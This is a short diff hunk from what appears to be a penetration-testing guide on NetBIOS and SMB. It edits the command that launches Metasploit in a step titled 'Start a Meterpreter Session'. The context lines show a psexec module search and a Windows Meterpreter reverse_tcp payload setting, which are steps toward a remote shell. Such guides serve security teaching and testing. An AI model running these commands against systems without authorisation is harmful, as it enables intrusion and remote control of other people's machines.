@@ -201,7 +201,7 @@ While NetBIOS and SMB were once closely linked, modern networks primarily rely o
 
 14. **Start a Meterpreter Session:**
 
-    `msfconsole -q`  
+    `start msfconsole -q`  
     `search psexec`  
     `use [module]`  
     `set payload windows/x64/meterpreter/reverse_tcp`  
